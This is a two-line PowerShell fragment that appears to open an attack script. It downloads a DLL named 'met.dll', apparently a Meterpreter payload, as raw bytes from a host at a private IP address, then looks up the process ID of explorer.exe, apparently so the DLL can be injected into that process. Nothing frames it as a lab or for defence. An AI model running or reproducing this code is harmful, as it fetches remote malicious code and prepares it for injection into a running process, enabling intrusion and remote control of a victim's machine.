$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.102/met.dll')
$procid = (Get-Process -Name explorer).Id
